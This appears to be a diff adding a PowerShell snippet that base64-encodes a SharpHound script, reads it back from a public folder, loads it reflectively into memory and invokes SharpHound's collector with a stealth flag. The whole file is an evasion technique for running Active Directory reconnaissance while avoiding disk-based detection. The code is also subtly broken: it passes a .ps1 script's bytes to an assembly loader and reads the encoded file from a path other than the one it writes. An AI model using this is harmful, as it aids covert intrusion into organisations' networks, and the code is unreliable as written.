@@ -1,1 +1,17 @@
+$bytes = [System.IO.File]::ReadAllBytes("SharpHound.ps1")
+$b64 = [Convert]::ToBase64String($bytes)
+$b64 | Out-File "b64_sh.txt"
 
+# Read the Base64 from a local text file (not a URL)
+$b64_data = Get-Content "C:\Users\Public\b64_sh.txt" -Raw
+
+# Decode and load directly into memory (Reflective Loading)
+$decoded = [System.Convert]::FromBase64String($b64_data)
+$Assembly = [System.Reflection.Assembly]::Load($decoded)
+
+# Identify the entry point for SharpHound
+$BindingFlags = [Reflection.BindingFlags]"Static,Public,NonPublic"
+$EntryPoint = $Assembly.GetType("Sharphound.Program").GetMethod("InvokeSharpHound", $BindingFlags)
+
+# Execute with arguments
+$EntryPoint.Invoke($null, @( @("-c", "Default", "--stealth") ))
